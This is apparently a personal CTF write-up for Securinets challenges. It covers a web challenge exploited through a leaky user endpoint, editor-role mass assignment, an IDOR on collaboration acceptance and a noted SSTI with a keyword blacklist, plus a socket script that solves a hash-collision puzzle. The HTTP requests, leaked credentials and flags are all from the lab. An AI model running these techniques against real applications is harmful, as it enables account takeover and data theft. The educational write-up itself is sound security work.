---
title: "Securinets"
date: 2025-10-05
draft: false
description: "Securinets"
---
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

<h2>🏆 253/558</h2>

---

### Web

#### Puzzle

<details>

Looking through the source code we can find:

```py
@app.route('/db')
def list_db_files():
    """Public directory listing for /db"""
    files = []
    for file in Path(DB_DIR).glob('*'):
        if file.is_file():
            files.append({
                'name': file.name,
                'size': file.stat().st_size,
                'modified': datetime.fromtimestamp(file.stat().st_mtime).strftime('%Y-%m-%d %H:%M:%S')
            })

    return render_template('directory.html',
                         path='/db',
                         files=files,
                         is_public=True)
```

{{< figure src="/images/ctfs/Securinets/db_listing.png" alt="DB">}}

{{< figure src="/images/ctfs/Securinets/hashes.png" alt="DB">}}

Cracking the hash for the account `admin` revealed the password of `pizzaguy`

```py
('9ff6fba6-924d-4c09-9f2e-b89fa60fa8ed', '$2a$06$VhuKtbW6RM9BFml.u37gIeL1Dfg2NordyqvFNsfJ7YrXQKoicPSa2', 'admin', 'admin@securinets.tn', '+X5931173160349', 'admin', 1),
```

which happen to not be the active password of that account. However there are plenty of other accounts that might have something interesting on their account (notes). To check which of them are actually active we can use the `/users/<uuid>` endpoint using the UUIDs. This would also leak their password:

```py
@app.route('/users/<string:target_uuid>')
def get_user_details(target_uuid):
    current_uuid = session.get('uuid')
    if not current_uuid:
        return jsonify({'error': 'Unauthorized'}), 401

    current_user = get_user_by_uuid(current_uuid)
    if not current_user or current_user['role'] not in ('0', '1'):
        return jsonify({'error': 'Invalid user role'}), 403

    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("""
            SELECT uuid, username, email, phone_number, role, password
            FROM users
            WHERE uuid = ?
        """, (target_uuid,))
        user = c.fetchone()

    if not user:
        return jsonify({'error': 'User not found'}), 404

    return jsonify({
        'uuid': user['uuid'],
        'username': user['username'],
        'email': user['email'],
        'phone_number': user['phone_number'],
        'role': user['role'],
        'password': user['password']
    })
```

> For this we first have to register a new account using the editor role, more on how exactly that works later in the exploitation.

Turns out none of the UUIDs in the `old.db` are used, thus we cannot get the passwords. Cracking the hashed also seems to be an invalid option considering the amount of hashes there are. At this point im thinking, maybe there is a way to leak the UUID of a specific account. This could give us the option to retrieve the admins password and log into the admin dashboard.

Looking at the code again i noticed we have a SQL Injection over here via the username:

```py
@app.route('/collab/request', methods=['POST'])
def send_collab():
    if not is_localhost():
        return jsonify({'error': 'Access denied.'}), 403

    current_uuid = session.get('uuid')
    if not current_uuid:
        return 'Unauthorized', 401

    user = get_user_by_uuid(session['uuid'])
    if not user:
        return redirect('/login')
    if user['role'] == '0':
        return jsonify({'error': 'Admins cannot collaborate'}), 403

    target_username = request.form.get('username')
    target_user = get_user_by_username(target_username)
    if not target_user:
        return 'User not found', 404

    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        query = f"INSERT INTO collab_requests VALUES ('{current_uuid}', '{target_user['uuid']}')"
        c.execute(query)
        conn.commit()

    return jsonify({
        'message': 'Request sent',
        'to_uuid': target_user['uuid']
    })
```

There is one problem however: `if not is_localhost()`

```py
def is_localhost():
  client_ip = request.remote_addr
  try:
      ip = ipaddress.ip_address(client_ip)
      return ip.is_loopback
  except ValueError:
      return False
```

So we need to find a SSRF first, before we can exploit this.

Looking at the code really hard again, i found something new interesting:

```py
@app.route('/collab/accept/<string:request_uuid>', methods=['POST'])
def accept_collaboration(request_uuid):
    if not session.get('uuid'):
        return jsonify({'error': 'Unauthorized'}), 401

    user = get_user_by_uuid(session['uuid'])
    if not user:
        return redirect('/login')
    if user['role'] == '0':
        return jsonify({'error': 'Admins cannot collaborate'}), 403

    try:
        with sqlite3.connect(DB_FILE) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()

            c.execute("SELECT * FROM collab_requests WHERE uuid = ?", (request_uuid,))
            request = c.fetchone()

            if not request:
                return jsonify({'error': 'Request not found'}), 404

            c.execute("""
                INSERT INTO articles (uuid, title, content, author_uuid, collaborator_uuid)
                VALUES (?, ?, ?, ?, ?)
            """, (request['article_uuid'], request['title'], request['content'],
                  request['from_uuid'], request['to_uuid']))

            c.execute("UPDATE collab_requests SET status = 'accepted' WHERE uuid = ?", (request_uuid,))
            conn.commit()

            return jsonify({'message': 'Collaboration accepted'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

This seems to accept any collaboration request via the UUID. Since a Administrator is not allowed to accept a collaboration request:

```py
...
if user['role'] == '0':
    return jsonify({'error': 'Admins cannot collaborate'}), 403
...
```

We can be so kind, and do it for them. I created a new collaboration request and set the collaborator to `admin`. Checking the DOM for, we can find the corresponding collaboration UUID and hit up the accept Endpoint, so that the Administrator becomes a collaborator automatically:

```http
POST /collab/accept/65b3b0d8-eaf4-462e-8795-484455ecd3a3 HTTP/1.1
Host: puzzle-c4d26ae9.p1.securinets.tn
Content-Length: 0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Origin: http://puzzle-c4d26ae9.p1.securinets.tn
Referer: http://puzzle-c4d26ae9.p1.securinets.tn/collaborations
Accept-Encoding: gzip, deflate, br
Cookie: SRV=p2-1c9c9a9afd07712b; session=eyJ1dWlkIjoiOTY1ODA5Y2ItMGUwZi00NGRmLWFmZjMtN2YzMmY1MDQ2ZmYwIn0.aOI1Bw.JM4WnMPRR-wOiH7KN9nOPrSg-QQ
Connection: keep-alive
```

This worked, and now also reveals the `admin UUID` in the DOM:

{{< figure src="/images/ctfs/Securinets/note.png" alt="DB">}}

`a8ec97ad-e893-4d4e-8613-c23bfb14671b`

Now earlier we saw the `/users/<uuid>` Endpoint which leaks all the data for an account.

For this we have to create an account using the `editor` role which is actually quite simple:

```py
@app.route('/confirm-register', methods=['POST'])
def confirm_register():
  username = request.form['username']
  email = request.form.get('email', '')
  alphabet = string.ascii_letters + string.digits + '!@#$%^&*'
  password = ''.join(secrets.choice(alphabet) for _ in range(12))
  role = request.form.get('role', '2')

  role_map = {
      '1': 'editor',
      '2': 'user',
  }

  if role == '0':
      return jsonify({'error': 'Admin registration is not allowed.'}), 403

  if role not in role_map:
      return jsonify({'error': 'Invalid role id.'}), 400

  uid = str(uuid4())

  try:
      with sqlite3.connect(DB_FILE) as db:
          db.execute('INSERT INTO users (uuid, username, email, password, role) VALUES (?, ?, ?, ?, ?)',
                     (uid, username, email, password, role))
          db.commit()
  except sqlite3.IntegrityError:
      return jsonify({'error': 'Username already exists.'}), 400

  session['uuid'] = uid
  session['first_login'] = True
  session['first_login_password'] = password

  return jsonify({
      'success': True,
      'redirect': '/home'
  }), 200
```

Meaning, we just have to add the following to our registration request:
```http
------WebKitFormBoundaryNHE9YZ3m7D2ELmUN
Content-Disposition: form-data; name="role"

1
```

```http
POST /confirm-register HTTP/1.1
Host: puzzle-c4d26ae9.p1.securinets.tn
Content-Length: 437
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNHE9YZ3m7D2ELmUN
Accept: */*
Origin: http://puzzle-c4d26ae9.p1.securinets.tn
Referer: http://puzzle-c4d26ae9.p1.securinets.tn/register
Accept-Encoding: gzip, deflate, br
Cookie: SRV=p2-1c9c9a9afd07712b
Connection: keep-alive

------WebKitFormBoundaryNHE9YZ3m7D2ELmUN
Content-Disposition: form-data; name="username"

my_editor_acc
------WebKitFormBoundaryNHE9YZ3m7D2ELmUN
Content-Disposition: form-data; name="email"

x
------WebKitFormBoundaryNHE9YZ3m7D2ELmUN
Content-Disposition: form-data; name="role"

1
------WebKitFormBoundaryNHE9YZ3m7D2ELmUN
Content-Disposition: form-data; name="phone_number"

1
------WebKitFormBoundaryNHE9YZ3m7D2ELmUN--
```

```http
HTTP/1.1 200 OK
server: Werkzeug/3.1.3 Python/3.11.13
date: Sun, 05 Oct 2025 09:19:35 GMT
content-type: application/json
content-length: 36
vary: Cookie
set-cookie: session=.eJxNyDsKgDAMANC7ZLaQqq2NZ3DTXYqtEhAr_eAg3l3cfOO7YeWY8ryHjQ_ocyy--td82pSuEB30MC1BDixrNRqGCkrhbz2S1bohYQg70bbKCYuEotEKpVV6ITTwvESgH9E.aOI4Jw.oRvxBWEu7o3VLRBMhU83J4Wz1Gs; HttpOnly; Path=/

{"redirect":"/home","success":true}
```

After setting the session token we can hit up the `/users/a8ec97ad-e893-4d4e-8613-c23bfb14671b` endpoint:

```json
{"email":"admin@securinets.tn","password":"Adm1nooooX333!123!!%","phone_number":"77777777","role":"0","username":"admin","uuid":"a8ec97ad-e893-4d4e-8613-c23bfb14671b"}
```

And we got the Password: `Adm1nooooX333!123!!%`

Now we are in the Dashboard:

{{< figure src="/images/ctfs/Securinets/admin.png" alt="DB">}}

Also, quite funny that we can see the actual exploitation tests by the CTF contestants:

{{< figure src="/images/ctfs/Securinets/recent_articles.png" alt="DB">}}

The next best thing to try, is exploiting this screaming template injection → RCE:

```py
@app.route('/admin/ban_user', methods=['POST'])
@admin_required
def ban_user():
  def is_safe_input(user_input):
      blacklist = [
      '__', 'subclasses', 'self', 'request', 'session',
      'config', 'os', 'import', 'builtins', 'eval', 'exec', 'compile',
      'globals', 'locals', 'vars', 'delattr', 'getattr', 'setattr', 'hasattr',
      'base', 'init', 'new', 'dict', 'tuple', 'list', 'object', 'type',
      'repr', 'str', 'bytes', 'bytearray', 'format', 'input', 'help',
      'file', 'open', 'read', 'write', 'close', 'seek', 'flush', 'popen',
      'system', 'subprocess', 'shlex', 'commands', 'marshal', 'pickle', 'tempfile',
      'os.system', 'subprocess.Popen', 'shutil', 'pathlib', 'walk', 'stat',
      '[', '(', ')', '|', '%','_', '"','<', '>','~'
      ]
      lower_input = user_input.lower()
      return not any(bad in lower_input for bad in blacklist)

  username = request.form.get('username', '')

  if not is_safe_input(username):
      return admin_panel(ban_message='Blocked input.'), 400

  with sqlite3.connect(DB_FILE) as conn:
      c = conn.cursor()
      c.execute("SELECT * FROM users WHERE username = ?", (username,))
      user = c.fetchone()

  if not user:
      template = 'User {} does not exist.'.format(username)
  else:
      template = 'User account {} is too recent to be banned'.format(username)

  ban_message = render_template_string(template)

  return admin_panel(ban_message=ban_message), 200
```

We can simply check that we have SSTI:

{{< figure src="/images/ctfs/Securinets/ssti.png" alt="DB">}}

Since all the other methods and things in this challange already were a giant rabbit hole, this seemed like a big `red flag` at least for now, since the blacklist filter is almost impossible to bypass. Thus i searched the source code again for things only the admin can access `@admin_required`, and was not protected by the (also impossible to bypass without a proxy infront of the application) `is_localhost`.

I found the equivalent to the `/db/` endpoint:

```py
@app.route('/data')
@admin_required
def list_data_files():
  files = []
  for file in Path(DATA_DIR).glob('*'):
      if file.is_file():
          files.append({
              'name': file.name,
              'size': file.stat().st_size,
              'modified': datetime.fromtimestamp(file.stat().st_mtime).strftime('%Y-%m-%d %H:%M:%S')
          })
```

{{< figure src="/images/ctfs/Securinets/data_listing.png" alt="DB">}}

The ZIP was protected by a password upon unzipping, thus i checked the `dbconnect.exe` file. Running a quick `strings` on that file actually revealed a Password:

```bash
....
libgcj-16.dll
_Jv_RegisterClasses
db_resource.dat
Error opening file for writing
server = '127.0.0.1'
database = 'puzzledb'
username = 'sa'
password = 'PUZZLE+7011_X207+!*'
[*] Please provide the following connection parameters:
Server:
Database:
Username:
Password:
....
```

After trying to unzip with `PUZZLE+7011_X207+!*` as the password, we actually got the Flag:

`Securinets{777_P13c3_1T_Up_T0G3Th3R}`

Yippe.

</details>

---

### Misc

#### MD7

<details>

```py
import socket
import re

def create_collision_pairs():
    pairs = []

    for i in range(1, 10):
        pairs.append((str(i), str(i) + '9'))

    for i in range(10, 100):
        if i % 10 != 9:
            i_str = str(i)
            reversed_i = i_str[::-1]  # reverse digits
            incremented_i = ''.join([str((int(d) + 1) % 10) for d in reversed_i])
            pass

    # The pattern is that if you have a number X, then X with a 9 appended often
    # (after proper processing) produces the same hash
    known_pairs = [
        ("1", "19"), ("2", "29"), ("3", "39"), ("4", "49"), ("5", "59"),
        ("6", "69"), ("7", "79"), ("8", "89"), ("9", "99"), ("10", "109"),
        ("11", "119"), ("12", "129"), ("13", "139"), ("14", "149"), ("15", "159"),
        ("16", "169"), ("17", "179"), ("18", "189"), ("20", "209"), ("21", "219"),
        ("22", "229"), ("23", "239"), ("24", "249"), ("25", "259"), ("26", "269"),
        ("27", "279"), ("28", "289"), ("30", "309"), ("31", "319"), ("32", "329"),
        ("33", "339"), ("34", "349"), ("35", "359"), ("36", "369"), ("37", "379"),
        ("38", "389"), ("40", "409"), ("41", "419"), ("42", "429"), ("43", "439"),
        ("44", "449"), ("45", "459"), ("46", "469"), ("47", "479"), ("48", "489"),
        ("50", "509"), ("51", "519"), ("52", "529"), ("53", "539"), ("54", "549"),
        ("55", "559"), ("56", "569"), ("57", "579"), ("58", "589"), ("60", "609"),
        ("61", "619"), ("62", "629"), ("63", "639"), ("64", "649"), ("65", "659"),
        ("66", "669"), ("67", "679"), ("68", "689"), ("70", "709"), ("71", "719"),
        ("72", "729"), ("73", "739"), ("74", "749"), ("75", "759"), ("76", "769"),
        ("77", "779"), ("78", "789"), ("80", "809"), ("81", "819"), ("82", "829"),
        ("83", "839"), ("84", "849"), ("85", "859"), ("86", "869"), ("87", "879"),
        ("88", "889"), ("90", "909"), ("91", "919"), ("92", "929"), ("93", "939"),
        ("94", "949"), ("95", "959"), ("96", "969"), ("97", "979"), ("98", "989"),
        ("100", "1009"), ("101", "1019"), ("102", "1029"), ("103", "1039"), ("104", "1049"),
        ("105", "1059"), ("106", "1069"), ("107", "1079"), ("108", "1089"), ("110", "1109"),
        ("111", "1119"), ("112", "1129"), ("113", "1139"), ("114", "1149"), ("115", "1159"),
        ("116", "1169"), ("117", "1179"), ("118", "1189"), ("120", "1209"), ("121", "1219"),
        ("122", "1229"), ("123", "1239"), ("124", "1249"), ("125", "1259"), ("126", "1269"),
        ("127", "1279"), ("128", "1289"), ("130", "1309"), ("131", "1319"), ("132", "1329"),
        ("133", "1339"), ("134", "1349"), ("135", "1359"), ("136", "1369"), ("137", "1379"),
        ("138", "1389"), ("140", "1409"), ("141", "1419"), ("142", "1429"), ("143", "1439"),
        ("144", "1449"), ("145", "1459"), ("146", "1469"), ("147", "1479"), ("148", "1489"),
        ("150", "1509"), ("151", "1519"), ("152", "1529"), ("153", "1539"), ("154", "1549"),
        ("155", "1559"), ("156", "1569"), ("157", "1579"), ("158", "1589"), ("160", "1609"),
        ("161", "1619"), ("162", "1629"), ("163", "1639"), ("164", "1649"), ("165", "1659"),
        ("166", "1669"), ("167", "1679"), ("168", "1689"), ("170", "1709"), ("171", "1719"),
        ("172", "1729"), ("173", "1739"), ("174", "1749"), ("175", "1759"), ("176", "1769"),
        ("177", "1779"), ("178", "1789"), ("180", "1809"), ("181", "1819"), ("182", "1829"),
        ("183", "1839"), ("184", "1849"), ("185", "1859"), ("186", "1869"), ("187", "1879"),
        ("188", "1889"), ("190", "1909"), ("191", "1919"), ("192", "1929"), ("193", "1939"),
        ("194", "1949"), ("195", "1959"), ("196", "1969"), ("197", "1979"), ("198", "1989")
    ]
    return known_pairs

def connect_and_solve():
    host = "numbers.p2.securinets.tn"
    port = 7011

    # Create socket and connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Receive initial message
    response = s.recv(4096).decode()
    print(response)

    # Get collision pairs
    pairs = create_collision_pairs()
    pair_idx = 0

    while pair_idx < len(pairs):
        # Receive the prompt
        data = s.recv(4096).decode()
        print(data, end='')

        if "(1/100)" in data or "(2/100)" in data or "(3/100)" in data:
            print(f"Pair {pair_idx+1}/100: Using {pairs[pair_idx][0]}, {pairs[pair_idx][1]}")

        if "Enter first number:" in data:
            # Send first number of the current pair
            first_num = pairs[pair_idx][0]
            s.send((first_num + '\n').encode())
            print(first_num)

        elif "Enter second number:" in data:
            # Send second number of the current pair
            second_num = pairs[pair_idx][1]
            s.send((second_num + '\n').encode())
            print(second_num)
            pair_idx += 1  # Move to next pair after sending second number

    # Receive and print final result
    final_response = s.recv(4096).decode()
    print(final_response)

    s.close()

if __name__ == "__main__":
    connect_and_solve()
```

`Securinets{floats_in_js_xddddd}`
</details>